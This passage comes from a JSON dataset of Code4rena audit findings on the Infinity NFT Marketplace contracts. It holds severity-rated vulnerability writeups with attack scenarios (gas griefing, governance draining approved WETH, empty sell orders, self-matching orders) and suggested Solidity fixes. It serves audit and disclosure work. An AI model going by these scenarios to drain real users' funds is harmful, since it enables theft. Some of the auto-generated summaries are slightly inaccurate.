risk.\n\n\n\n***\n\n\n\n",
      "summary": "\nThis bug report is about the function `matchOneToOneOrders` in the InfinityExchange smart contract. The function transfers an arbitrary amount of WETH from the user, `buy.signer`, in its inner call to `_execMatchOneToOneOrders`. This amount is calculated dynamically based off of the gas consumption consumed during the trace, and is controlled by the seller since the seller's token can be malicious and purposefully consume a large amount of gas to grief the buyer. If a buyer purchases a malicious token, the `_transferNFTs` will result in a call to an `ERC721.safeTransferFrom` that can exhibit any behavior such as wasting gas, resulting in the buyer's WETH being sent to the protocol. \n\nProof of concept of this vulnerability is a buyer giving infinite WETH approval to the exchange contract and unknowingly purchasing a malicious token from an attacker. The attacker's token wastes gas in the transfer call and causes all of the buyer's WETH to be sent to the protocol when `matchOneToOneOrders` is performed by the match executor.\n\nTo mitigate this vulnerability, it is recommended to allow users to input a maximum fee/ gas cost they are willing to spend on each order. Manual gas accounting is error prone and it would make more sense to allow users to match orders themselves instead of extracting fees to compensate the matcher.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/74",
      "tags": [],
      "finders": [
        "0xalpharush"
      ]
    },
    {
      "id": "2785",
      "title": "[M-08] Incorrect condition marks valid order as invalid",
      "impact": "MEDIUM",
      "content": "_Submitted by csanuragjain, also found by KIntern_\n\n\n`canExecMatchOrder` is having an incorrect check which makes a valid order as invalid. \n\n`doItemsIntersect` function is also checked on sell.nfts, buy.nfts which is incorrect. \n\n`doItemsIntersect` should only be checked in reference to constructedNfts.\n\n### Proof of Concept\n\n1.  Assume buy has nfts {A,B,C}, sell has nft {A,B}, constructedNfts has nft {A}, buy.constraints\\[0]/sell.constraints\\[0]/numConstructedItems is 1\n\n2.  Ideally this order should match since constructedNfts {A} is present in both buy and sell\n\n3.  But this will not match since doItemsIntersect(sell.nfts, buy.nfts) will fail because of item C which is not present in sell\n\n### Recommended Mitigation Steps\n\nRemove doItemsIntersect(sell.nfts, buy.nfts) from InfinityOrderBookComplication.sol#L140\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/120#issuecomment-1162975062):**\n > Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/74a7d6b39dc441b5b496b74735a1b09b93bef12f\n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/120#issuecomment-1179814096):**\n > Some orders that should be matched would revert. Lowering this to Medium risk.\n\n\n\n***\n\n",
      "summary": "\nA bug report has been filed for the code found at https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityOrderBookComplication.sol#L140. The bug is caused by an incorrect check which makes a valid order invalid. The check is done on sell.nfts and buy.nfts when it should only be done in reference to constructedNfts. The bug can be demonstrated by an example where buy has nfts {A,B,C}, sell has nft {A,B}, constructedNfts has nft {A}, buy.constraints[0]/sell.constraints[0]/numConstructedItems is 1. In this case, the order should match since constructedNfts {A} is present in both buy and sell, but the order will not match since doItemsIntersect(sell.nfts, buy.nfts) will fail due to item C not being present in sell. The recommended mitigation step is to remove doItemsIntersect(sell.nfts, buy.nfts) from InfinityOrderBookComplication.sol#L140.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/120",
      "tags": [],
      "finders": [
        "csanuragjain",
        "KIntern"
      ]
    },
    {
      "id": "2784",
      "title": "[M-07] Malicious governance can use `updateWethTranferGas` to steal WETH from buyers",
      "impact": "MEDIUM",
      "content": "_Submitted by shenwilly, also found by 0x29A, berndartmueller, BowTiedWardens, peritoflores, and VAD37_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1260-L1263>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L739-L747>\n\n### Vulnerability Details\n\nA malicious or compromised governance can set the transfer gas cost to an unreasonable amount and steal approved WETH from buyers.\n\nThere are two ways for governance to exploit this:\n\n*   When an order is being executed, governance can frontrun the transactions by setting `WETH_TRANSFER_GAS_UNITS` to a very high amount.\n*   Set `WETH_TRANSFER_GAS_UNITS` to a very high amount, and execute trades against active buy orders. As long as the value of WETH to steal is higher than the cost to prepare the NFTs to sell, it is profitable to do so.\n\n### Proof of Concept\n\n*   `WETH_TRANSFER_GAS_UNITS` is set to `50000`.\n*   Alice has 100 WETH and 100 USDC. She approved infinite allowance to `InfinityExchange`.\n*   Alice signs a buy order to buy a FakePunk NFT with 100 USDC price.\n*   Malicious governance sets `WETH_TRANSFER_GAS_UNITS` to a very high amount such that the [gasCost](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L739) calculation equals 100 WETH.\n*   Governance then bought a FakePunk in open market, and fills Alice's order.\n*   Alice received the NFT but paid 100 WETH as gas cost.\n\n### Recommended Mitigation Steps\n\nSet a sanity check in `updateWethTranferGas` so governance can't set it to unreasonable value. Consider using timelock for setting governance settings.\n\n    function updateWethTranferGas(uint32 _wethTransferGasUnits) external onlyOwner {\n        require(_wethTransferGasUnits <= 100000, \"gas unit must not be higher than 100000\");\n        WETH_TRANSFER_GAS_UNITS = _wethTransferGasUnits;\n        emit NewWethTransferGasUnits(_wethTransferGasUnits);\n    }\n\n**[nneverlander (Infinity) acknowledged, but disagreed with severity](https://github.com/code-423n4/2022-06-infinity-findings/issues/127)** \n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/127#issuecomment-1181006146):**\n > When a transaction is sent by the matching engine, the user pays for the gas costs of their portion of that call. There's overhead in actually getting the money from the user in WETH, which is estimated with WETH_TRANSFER_GAS_UNITS. That value is currently uncapped so the admin could increase it significantly, impacting users who signed orders back when that value was more reasonably assigned.\n> \n> Agree with Medium risk here.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the InfinityExchange smart contract. It is possible for a malicious or compromised governance to set the transfer gas cost to an unreasonable amount and steal approved WETH from buyers. There are two ways for governance to exploit this: when an order is being executed, they can frontrun the transactions by setting the WETH_TRANSFER_GAS_UNITS to a very high amount, or set the WETH_TRANSFER_GAS_UNITS to a very high amount and execute trades against active buy orders. A proof of concept was provided, in which the WETH_TRANSFER_GAS_UNITS was set to 50000, Alice had 100 WETH and 100 USDC, and she approved infinite allowance to the InfinityExchange. Malicious governance then set the WETH_TRANSFER_GAS_UNITS to a very high amount, bought a FakePunk in the open market, and filled Alice's order. As a result, Alice received the NFT but paid 100 WETH as gas cost.\n\nThe recommended mitigation steps are to set a sanity check in the updateWethTranferGas function so governance can't set it to unreasonable values, and consider using a timelock for setting governance settings.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/127",
      "tags": [],
      "finders": [
        "VAD37",
        "BowTiedWardens",
        "berndartmueller",
        "shenwilly",
        "peritoflores",
        "0x29A"
      ]
    },
    {
      "id": "2783",
      "title": "[M-06] Bug in `MatchOneToManyOrders` may cause tokens theft",
      "impact": "MEDIUM",
      "content": "_Submitted by PwnedNoMore_\n\nThe `MatchOneToManyOrders` does not check whether a given sell order is malicious, i.e., containing no NFT tokens but still requiring payment.\n\nThis may cause the sellers to maliciously profit.\n\nFor example, we have a `buyOrder` and a set of sell orders `[sellOrder0, sellOrder1, sellOrder2]`. Originally, they match well but with a legal price gas (which is common in the real world), i.e., `MatchOneToManyOrders(buyOrder, [sellOrder0, sellOrder1, sellOrder2])` can be successfully processed.\n\nHowever, If the hacker proposes another `sellOrder3` which sells nothing but requests money/tokens. The `MatchOneToManyOrders(buyOrder, [sellOrder0, sellOrder1, sellOrder2, sellOrder3])` will also succeed and the hacker does not need to send out any NFT token but grabs a considerable gain.\n\n### Attack Scenario\n\nThere are two possible attack scenarios.\n\n#### The `MATCH_EXECUTOR` is not in a good faith\n\n`MATCH_EXECUTOR` can always gain profit by leveraging this vulnerability. That is, every time the executor proposes a `MatchOneToManyOrders`, it can add one more *EMPTY* order to gain the profit.\n\nIt is one kind of centralization issue. All the processes should happen in a trust-less environment.\n\n#### Hackers can brute force the price gaps by sending out a large amount of *EMPTY* sell orders\n\nNote that creating an order happens off-chain. That means, the hacker can send out a large amount of *EMPTY* orders without paying any gas fee.\n\nOnce the executor picks any of the malicious orders, the hacker can gain the profit without a loss of NFT tokens.\n\nThis vulnerability also affects `matchOrders`.\n\n### Proof of Concept\n\nFor full details, see [original submission](https://github.com/code-423n4/2022-06-infinity-findings/issues/65).\n\n### Recommended Mitigation Steps\n\nTo mitigate the issue entirely, I would suggest banning any empty NFT transfers.\n\nFor example, `numNfts` must be bigger than zero [here](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1042). Also make sure the ERC1155 transferring at least 1 item.\n\n**[nneverlander (Infinity) acknowledged and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/65#issuecomment-1162896366):**\n> Please check this: https://github.com/infinitydotxyz/exchange-contracts-v2/commit/7f0e195d52165853281b971b8610b27140da6e41\n> \n> No more ERC1155 either.\n> \n> The loop that transfers NFTs already checks for non empty array\n> \n> Not sure of the assessment.\n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/65#issuecomment-1179750238):**\n> This is a great report, appreciate the detail and the PoC code.\n> \n> Given that the call must originate from the match executor, it seems unlikely that it would match with an empty sell order. Additionally it should be easy to filter these when submitted off-chain. With that in mind, lowering this to a Medium risk issue.\n\n\n\n***\n\n",
      "summary": "\nA bug report has been filed concerning the `MatchOneToManyOrders` function in the code-423n4/2022-06-infinity repository. The bug allows malicious actors to profit without sending out any Non-Fungible Tokens (NFTs). This could be done by creating a sell order that requires payment but contains no NFTs. \n\nThe bug affects both the `MatchOneToManyOrders` and `matchOrders` functions. An attack scenario could be the `MATCH_EXECUTOR` taking advantage of the vulnerability by adding an *EMPTY* order to gain a profit, or a hacker sending out a large amount of *EMPTY* orders without paying any gas fee. The bug has been confirmed using manual inspection and a proof of concept script.\n\nThe recommended mitigation step is to ban any empty NFT transfers, such as making sure `numNfts` is bigger than zero and that the ERC1155 is transferring at least 1 item.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/65",
      "tags": [],
      "finders": [
        "PwnedNoMore"
      ]
    },
    {
      "id": "2782",
      "title": "[M-05] ETH mistakenly sent over with ERC20 based `takeOrders` and `takeMultipleOneOrders` calls will be lost",
      "impact": "MEDIUM",
      "content": "_Submitted by obtarian, also found by 0xsanson, cccz, and VAD37_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L323-L327>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L359-L363>\n\n### Vulnerability details\n\n`takeOrders()` and `takeMultipleOneOrders()` are the main user facing functionality of the protocol. Both require `currency` to be fixed for the call and can have it either as a ERC20 token or ETH. This way, the probability of a user sending over a ETH with the call whose `currency` is a ERC20 token isn't negligible. However, in this case ETH funds of a user will be permanently lost.\n\nSetting the severity to medium as this is permanent fund freeze scenario conditional on a user mistake, which probability can be deemed high enough as the same functions are used for ETH and ERC20 orders.\n\n### Proof of Concept\n\nBoth takeOrders() and takeMultipleOneOrders() only check that ETH funds are enough to cover the order's `totalPrice`:\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L323-L327>\n\n```solidity\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    }\n```\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L359-L363>\n\n```solidity\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    }\n```\n\nWhen `currency` is some ERC20 token, while `msg.value > 0`, the `msg.value` will be permanently frozen within the contract.\n\n### Recommended Mitigation Steps\n\nConsider adding the check for `msg.value` to be zero for the cases when it is not utilized:\n\n```solidity\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    } else {\n      require(msg.value == 0, 'non-zero ETH value');\n    }\n```\n\n**[nneverlander (Infinity) confirmed](https://github.com/code-423n4/2022-06-infinity-findings/issues/346)**\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/346#issuecomment-1179723118):**\n > When accepting an order using ERC20 tokens, any ETH included will be accepted as exchange fees instead of reverting the tx or refunding to the user.\n> \n> This is a result of user error, but leads to a direct loss of funds. Accepting as a Medium risk submission.\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the code of the InfinityExchange.sol contract, which could potentially lead to a user permanently losing their ETH funds. This bug occurs when a user attempts to make an order using ETH, and the `currency` passed in the call is a ERC20 token. In this case, the `msg.value` will be permanently frozen within the contract, as the code only checks that `msg.value` is enough to cover the order's `totalPrice`.\n\nThe severity of this bug has been set to medium, as it is a permanent fund freeze scenario that is conditional on a user mistake, and the probability of it occurring is deemed high enough as the same functions are used for both ETH and ERC20 orders.\n\nTo mitigate this bug, the code should be modified to include a check for `msg.value` to be zero for cases when it is not utilized. The recommended code is provided in the bug report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/346",
      "tags": [],
      "finders": [
        "cccz",
        "obtarian",
        "VAD37",
        "0xsanson"
      ]
    },
    {
      "id": "2781",
      "title": "[M-04] Fund loss or griefing in all order matching functions [`matchOneToOneOrders()`, `matchOneToManyOrders()`, `matchOrders()`, `takeMultipleOneOrders()`, `takeOrders()`] because condition `(seller != buyer )` is not checked in any of them",
      "impact": "MEDIUM",
      "content": "_Submitted by unforgiven, also found by GreyArt_\n\nFunctions `matchOneToOneOrders()`, `matchOneToManyOrders()`, `matchOrders()`, `takeMultipleOneOrders()`, `takeOrders()` are for order matching and order execution and they validate different things about orders but there is no check for that `seller != buyer`, which can cause wrong order matching resulting in fund lose or fund theft or griefing. (it can be combined with other vulns to perform more damaging attacks)\n\n### Proof of Concept\n\nWe only give proof of concept for `matchOneToManyOrders()` and other order execution/matching functions has similar bugs which root cause is not checking `seller != buyer`.\nThis is `matchOneToManyOrders()` code:\n\n      /**\n       @notice Matches one  order to many orders. Example: A buy order with 5 specific NFTs with 5 sell orders with those specific NFTs.\n       @dev Can only be called by the match executor. Refunds gas cost incurred by the\n            match executor to this contract. Checks whether the given complication can execute the match.\n       @param makerOrder The one order to match\n       @param manyMakerOrders Array of multiple orders to match the one order against\n      */\n      function matchOneToManyOrders(\n        OrderTypes.MakerOrder calldata makerOrder,\n        OrderTypes.MakerOrder[] calldata manyMakerOrders\n      ) external {\n        uint256 startGas = gasleft();\n        require(msg.sender == MATCH_EXECUTOR, 'OME');\n        require(_complications.contains(makerOrder.execParams[0]), 'invalid complication');\n        require(\n          IComplication(makerOrder.execParams[0]).canExecMatchOneToMany(makerOrder, manyMakerOrders),\n          'cannot execute'\n        );\n        bytes32 makerOrderHash = _hash(makerOrder);\n        require(isOrderValid(makerOrder, makerOrderHash), 'invalid maker order');\n        uint256 ordersLength = manyMakerOrders.length;\n        // the below 3 variables are copied to memory once to save on gas\n        // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas\n        // since these values won't change during function execution, we can save on gas by copying them to memory once\n        // instead of SLOADing once for each loop iteration\n        uint16 protocolFeeBps = PROTOCOL_FEE_BPS;\n        uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;\n        address weth = WETH;\n        if (makerOrder.isSellOrder) {\n          for (uint256 i = 0; i < ordersLength; ) {\n            // 20000 for the SSTORE op that updates maker nonce status from zero to a non zero status\n            uint256 startGasPerOrder = gasleft() + ((startGas + 20000 - gasleft()) / ordersLength);\n            _matchOneMakerSellToManyMakerBuys(\n              makerOrderHash,\n              makerOrder,\n              manyMakerOrders[i],\n              startGasPerOrder,\n              protocolFeeBps,\n              wethTransferGasUnits,\n              weth\n            );\n            unchecked {\n              ++i;\n            }\n          }\n          isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n        } else {\n          uint256 protocolFee;\n          for (uint256 i = 0; i < ordersLength; ) {\n            protocolFee += _matchOneMakerBuyToManyMakerSells(\n              makerOrderHash,\n              manyMakerOrders[i],\n              makerOrder,\n              protocolFeeBps\n            );\n            unchecked {\n              ++i;\n            }\n          }\n          isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n          uint256 gasCost = (startGas - gasleft() + WETH_TRANSFER_GAS_UNITS) * tx.gasprice;\n          // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n          // else we need to send the protocol fee separately in the execution currency\n          // since the buyer is common across many sell orders, this part can be executed outside the above for loop\n          // in contrast to the case where if the one order is a sell order, we need to do this in each for loop\n          if (makerOrder.execParams[1] == weth) {\n            IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), protocolFee + gasCost);\n          } else {\n            IERC20(makerOrder.execParams[1]).safeTransferFrom(makerOrder.signer, address(this), protocolFee);\n            IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), gasCost);\n          }\n        }\n      }\n\nin its executions it calls `InfinityOrderBookComplication.canExecMatchOneToMany()`, `verifyMatchOneToManyOrders()`, `isOrderValid()` to see that if orders are valid and one order matched to all other orders but there is no check for `seller != buyer` in any of those functions. and also `ERC721` and `ERC20` allows funds and assets to be transferred from address to itself.\nSo it's possible for `matchOneToManyOrders()` to match one user sell orders to its buy orders which can cause fund theft or griefing. This is the scenario for fund lose in `matchOneToManyOrders()`:\n\n1.  Let's assume orders `NFT` ids are for one collection for simplicity.\n2.  `NFT ID[1]` fair price is `8 ETH` and `NFT ID[2]` fair price is `2 ETH`.\n3.  `user1` wants to buy `NFT IDs[1,2]` at `10 ETH` (both of them) so he create one buy order and signs it.\n4.  `user1` wants to sell `NFT ID[1]` at `2.5 ETH` and sell `NFT ID[2]` at `8.5 ETH`. and he wants to sell them immediately after buying them so he create this two sell orders and sign them.\n5.  `attacker` who has `NFT ID[1]` creates an sell order for it at `7.5 ETH` and signs it.\n6.  Off-chain machining engine sends this orders to `matchOneToManyOrders()`: many orders = \\[`(attacker sell ID[1] at 7.5 ETH)` , `(user1 sell ID[1] at 2.5 ETH)`] , one order = `(user1 buy IDs[1,2] at 10ETH)`\n7.  Function `matchOneToManyOrders()` logic will check orders and their matching and all the checks would be passed for matching one order to many order(becase tokens lists intersects and numTokens are valids too (`1+1=2`))\n8.  Function `matchOneToManyOrders()` would execute order and transfer funds and tokens which would result in: (transferring `7.5 ETH` from `user 1` to `attacker`) (transferring `2.5 ETH` from `user1` to `user1`) (transferring `NFT ID[1]` from `attacker` to `user1`) (transferring `NFT ID[1]` from `user1` to `user1`)\n9.  So in the end contract executed `user1` buy order `(user1 buy IDs[1,2] at 10ETH)` but `user` only received `NFT ID[1]` and didn't received `NFT ID[2]` so contract code perform operation contradiction to what `user1` has been signed.\n\nOf course for this attack to work for `matchOneToManyOrders()` off-chain matching engine need to send wrong data but checks on the contract are not enough.\n\nThere are other scenarios for other functions that can cause griefing, for example for function `matchOrders()`:\na user can have multiple order to buy some tokens in list of ids. it's possible to match these old orders:\n\n1.  `user1` has this order: A:`(user1 BUY 1 of IDs[1,2,3])` and  B:`(user1 BUY 1 of IDs[1,4,5])`\n2.  then the order B get executed for ID\\[1] and `user1` become the owner of `ID[1]`\n3.  `user1` wants to sell some of his tokens so he signs this order: C::`(user1 SELL 1 of IDs[1,6,7])`\n4.  matching engine would send order A and C with `constructedNfts=ID[1]` to `matchOrders()`.\n5.  `matchOrders()` would check conditions and would see that conditions are met and perform the transaction.\n6.  `user1` would pay some unnecessary order fee and it would become like griefing and DOS attack for him.\n\nThere may be other scenarios for this vulnerability to be harmful for users.\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nAdd some checks to ensure that `seller != buyer`\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/130#issuecomment-1160551805):**\n > Agree with assessment. Fixed in: https://github.com/infinitydotxyz/exchange-contracts-v2/commit/c3c0684ac02e0cf1c03cdbee7e68c5a37fa334a8\n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/130#issuecomment-1179818269):**\n > This is an interesting scenario where a buyer looking to flip immediately could have their order under filled.\n> \n> Given the specifics of this scenario where the user needs to sign both a buy and a sell with the same NFTs, I'm inclined to rate this a Medium risk issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about functions in the InfinityExchange.sol contract that are used for order matching and order execution. These functions do not have a check for seller and buyer being different, which can lead to wrong order matching and potential fund loss. This vulnerability can be combined with other vulnerabilities to do more damage. \n\nA proof of concept is given for the function matchOneToManyOrders(). In this scenario, a user wants to buy two NFTs at a total cost of 10 ETH. They create one buy order and two sell orders, one for each NFT. An attacker who has one of the NFTs creates a sell order for it at 7.5 ETH. The off-chain matching engine sends these orders to the matchOneToManyOrders() function, which checks that the orders are valid and matches the one order to the many orders. The result is that the user transfers 7.5 ETH to the attacker, 2.5 ETH to themselves, and they receive the NFT from the attacker. \n\nFor the matchOrders() function, a user can have multiple orders to buy some tokens in a list of IDs. If the order is old, it is possible to match it. The user would then pay an unnecessary order fee, which could be seen as a griefing or DDoS attack. \n\nThe recommended mitigation step is to add checks to ensure that the seller and buyer are different.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/130",
      "tags": [],
      "finders": [
        "unforgiven",
        "GreyArt"
      ]
    },
    {
      "id": "2780",
      "title": "[M-03] Protocol fee rate can be arbitrarily modified by the owner and the new rate will apply to all existing orders",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug, also found by berndartmueller, BowTiedWardens, cccz, csanuragjain, defsec, GreyArt, joestakey, m9800, peritoflores, reassor, Ruhum, shenwilly, throttle, and zer0dot_\n\n```solidity\nfunction matchOneToOneOrders(\n    OrderTypes.MakerOrder[] calldata makerOrders1,\n    OrderTypes.MakerOrder[] calldata makerOrders2\n  ) external {\n    uint256 startGas = gasleft();\n    uint256 numMakerOrders = makerOrders1.length;\n    require(msg.sender == MATCH_EXECUTOR, 'OME');\n    require(numMakerOrders == makerOrders2.length, 'mismatched lengths');\n\n    // the below 3 variables are copied to memory once to save on gas\n    // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas\n    // since these values won't change during function execution, we can save on gas by copying them to memory once\n    // instead of SLOADing once for each loop iteration\n    uint16 protocolFeeBps = PROTOCOL_FEE_BPS;\n    uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;\n```\n\nPer [the comment](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1120-L1121):\n\n> Transfer fees. Fees are always transferred from buyer to the seller and the exchange although seller is the one that actually 'pays' the fees\n\nAnd the code:\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L725-L729>\n\n```solidity\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _transferMultipleNFTs(sell.signer, buy.signer, sell.nfts);\n    // transfer final amount (post-fees) to seller\n    IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, sell.signer, remainingAmount);\n```\n\nIn the current design/implementation, the protocol fee is paid from the buyer's wallet, regardless of whether the buyer is the taker or the maker. And the protocol fee will be deducted from the `execPrice`, only the `remainingAmount` will be sent to the seller.\n\nThis is unconventional as if the buyer placed a limit order, say to sell 1 Punk for 100 ETH, it means that the seller is expected to receive 100 ETH. And now the seller must consider the fee rate and if they expect 100 ETH, the price must be set to 101 ETH.\n\nWhile this is unconventional and a little inconvenience, it's still acceptable IF the protocol fee rate is fixed, OR the seller is the taker so that they can do the math and agrees to the protocol fee when they choose to fulfill the counterparty's maker order.\n\nHowever, that's not always the case with the current implementation: the protocol can be changed, effective immediately, and applies to all existing orders.\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1265-L1269>\n\n```solidity\n    /// @dev updates exchange fees\n  function setProtocolFee(uint16 _protocolFeeBps) external onlyOwner {\n    PROTOCOL_FEE_BPS = _protocolFeeBps;\n    emit NewProtocolFee(_protocolFeeBps);\n  }\n```\n\nPlus, when the protocol fee rate updated to a higher rate, say from `5%` to `50%`, an maker order placed before this fee rate update can be fulfilled by a buyer, while the buyer still pays the same amount, the seller (maker) will receive `45%` less than the initial sell order amount.\n\n### Recommendation\n\n1.  Consider making the protocol fee rate a constant, ie, can not be changed;\n2.  Or, consider changing to the protocol fee always be paid by the taker; while matching the maker buy and maker sell orders, the protocol fee must be paid from the price difference between the buy price and sell price;\n3.  Or, consider changing to the new protocol fee only applies to the orders created after the rate updated.\n\n**[nneverlander (Infinity) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/259#issuecomment-1160585250):**\n > This was a design decision. Initially we were fetching the protocol fee from the complication but decided not to make external contract calls for this to save on gas. The other option was to make the protocol fee a part of the maker order but that comes with its own attack surface.  So we implemented a compromise: https://github.com/infinitydotxyz/exchange-contracts-v2/commit/793ee814d86030477470c81c4f6fda353967a42a\n> \n> As such the severity of the bug can be classified as low since this assumes malicious intent on part of the protocol admin.\n\n**[HardlyDifficult (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/259#issuecomment-1179592297):**\n> Maker sell orders are charged the fee set at the time an order is filled and not when the order was created.\n> \n> I'm not sure that I agree this concern is limited to malicious intent. With the ability to change fee, it's safe to assume at some point the admin may choose to increase the fee. At that point, all outstanding maker sells are subject to a higher fee than expected. Some users may be more sensitive to this than others. The warden's recommendations seems to address that concern and the fix the sponsor posted mitigates it by setting a max fee that may apply.\n> \n> I think this is a Medium risk issue - an unexpected bump in fee impacting users who interacted with the system previous to that change is a form of value leak.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue in the code of the InfinityExchange smart contract. The code in question is from lines 132 to 146 and from lines 1120 to 1121. The issue is that the protocol fee is paid from the buyer's wallet regardless of whether the buyer is the taker or the maker. This means that if the buyer places a limit order, say to sell 1 Punk for 100 ETH, the seller will only receive the amount after the protocol fee is deducted from the execPrice. This is unconventional, as the seller is expected to receive the full amount. Additionally, the protocol fee rate can be changed, which could be detrimental to the seller. \n\nThe report recommends three potential solutions. The first is to make the protocol fee rate a constant, so it can not be changed. The second is to make the protocol fee always be paid by the taker. This means that when matching the maker buy and maker sell orders, the protocol fee must be paid from the price difference between the buy price and sell price. The third is to make the new protocol fee only applies to the orders created after the rate updated. \n\nOverall, this bug report is about an issue in the code of the InfinityExchange smart contract, where the protocol fee is paid from the buyer's wallet regardless of whether the buyer is the taker or the maker. The report recommends three potential solutions to address the issue.",
      "quality_score": 3,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/259",
      "tags": [
        "Admin"
      ],
      "finders": [
        "csanuragjain",
        "GreyArt",
        "zer0dot",
        "reassor",
        "BowTiedWardens",
        "cccz",
        "joestakey",
        "Ruhum",
        "throttle",
        "WatchPug",
        "berndartmueller",
        "shenwilly",
        "peritoflores",
        "m9800",
        "defsec"
      ]
    },
    {
      "id": "2779",
      "title": "[M-02] Maker order buyer is forced to reimburse the gas cost at any `tx.gasprice`",
      "impact": "MEDIUM",
